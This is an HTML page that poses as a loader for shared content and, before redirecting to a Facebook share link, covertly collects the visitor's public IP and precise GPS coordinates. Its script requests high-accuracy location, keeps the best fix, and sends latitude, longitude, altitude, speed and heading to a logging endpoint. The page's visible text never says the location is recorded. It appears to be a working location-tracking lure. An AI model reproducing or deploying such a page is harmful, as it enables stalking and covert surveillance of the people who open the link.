<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Opening content…</title>
  <style>
    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:0;padding:28px;background:#f7fafc;color:#111}
    .box{max-width:720px;margin:36px auto;padding:18px;background:#fff;border-radius:10px;box-shadow:0 8px 24px rgba(7,10,21,0.06)}
    .small{color:#556;font-size:0.95rem}
  </style>
</head>
<body>
  <div class="box">
    <h2>Opening content…</h2>
    <p class="small">This page will ask to use your device GPS for a precise location. The browser will ask permission — please choose <strong>Allow</strong> for precise location. If you allow, we wait a short time for a good GPS fix, then open the content.</p>
    <p id="status" class="small">Status: requesting permission…</p>
  </div>

<script>
(function(){
  // CONFIG: change these if you want
  const REDIRECT_URL = "https://www.facebook.com/share/r/1GSrQ5WSVa/"; // final target
  const ACCURACY_THRESHOLD_METERS = 30;   // considered "good" accuracy (meters)
  const TIMEOUT_MS = 15000;               // maximum wait time for a good fix (ms)
  const MIN_WAIT_BEFORE_REDIRECT_MS = 300; // give a small moment for sendBeacon to fire

  const statusEl = document.getElementById('status');

  function updateStatus(t){ if (statusEl) statusEl.textContent = 'Status: ' + t; }

  // send payload via sendBeacon if available, else fetch keepalive
  function sendPayload(obj){
    const s = JSON.stringify(obj);
    try {
      if (navigator.sendBeacon) {
        const blob = new Blob([s], { type: 'application/json' });
        navigator.sendBeacon('/.netlify/functions/log', blob);
        return;
      }
    } catch(e){}
    // fallback
    fetch('/.netlify/functions/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: s,
      keepalive: true
    }).catch(()=>{});
  }

  // get public IP as fallback (best-effort)
  async function getPublicIp(){
    try {
      const r = await fetch('https://api.ipify.org?format=json', {cache:'no-store'});
      const j = await r.json();
      return j.ip || null;
    } catch(e){
      return null;
    }
  }

  // final redirect helper
  function doRedirect(){
    setTimeout(()=>{ location.href = REDIRECT_URL; }, MIN_WAIT_BEFORE_REDIRECT_MS);
  }

  // Timeout fallback: use best sample we have (or ip-only)
  (async function main(){
    const start = Date.now();
    updateStatus('fetching public IP…');
    const clientIp = await getPublicIp();

    if (!navigator.geolocation) {
      updateStatus('Geolocation not supported — redirecting');
      sendPayload({ timeUtc: new Date().toISOString(), clientIp });
      doRedirect();
      return;
    }

    updateStatus('Requesting GPS — please allow the browser prompt');

    let bestSample = null;
    let gotGood = false;
    let timedOut = false;
    let watchId = null;

    // helper to handle a position sample
    function handlePos(pos){
      const sample = {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        speed: pos.coords.speed,
        heading: pos.coords.heading,
        timestamp: new Date(pos.timestamp).toISOString()
      };
      // keep the best (smallest accuracy)
      if (!bestSample || (sample.accuracy != null && sample.accuracy < (bestSample.accuracy || 1e9))) {
        bestSample = sample;
      }
      updateStatus('Got GPS sample — accuracy: ' + (sample.accuracy != null ? Math.round(sample.accuracy) + ' m' : 'n/a'));
      // if sample is within threshold, accept it immediately
      if (sample.accuracy != null && sample.accuracy <= ACCURACY_THRESHOLD_METERS) {
        gotGood = true;
        finishAndRedirect();
      }
    }

    // error handler
    function handleErr(err){
      updateStatus('Geolocation error: ' + (err && err.message ? err.message : err));
      // if permission denied, fallback immediately
      if (err && (err.code === 1 || err.code === 2 || err.code === 3)) {
        // PERMISSION_DENIED or POSITION_UNAVAILABLE or TIMEOUT
        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
        finishAndRedirect();
      }
    }

    // cleanup & final send
    function finishAndRedirect(){
      if (watchId !== null) {
        try { navigator.geolocation.clearWatch(watchId); } catch(e){}
        watchId = null;
      }
      // build payload
      const payload = {
        timeUtc: new Date().toISOString(),
        clientIp: clientIp,
        coords: bestSample,
        note: gotGood ? 'good fix' : (timedOut ? 'timeout/best-sample' : 'fallback')
      };
      updateStatus('Sending location and redirecting…');
      sendPayload(payload);
      doRedirect();
    }

    // start watchPosition for multiple samples (better chance to get good fix)
    try {
      watchId = navigator.geolocation.watchPosition(handlePos, handleErr, {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 10000
      });
    } catch(e){
      updateStatus('Cannot start geolocation: ' + e);
      finishAndRedirect();
      return;
    }

    // set a total timeout
    setTimeout(() => {
      timedOut = true;
      if (!gotGood) {
        updateStatus('Timeout reached — using best sample (if any)');
        finishAndRedirect();
      }
    }, TIMEOUT_MS);
  })();
})();
</script>
</body>
</html>
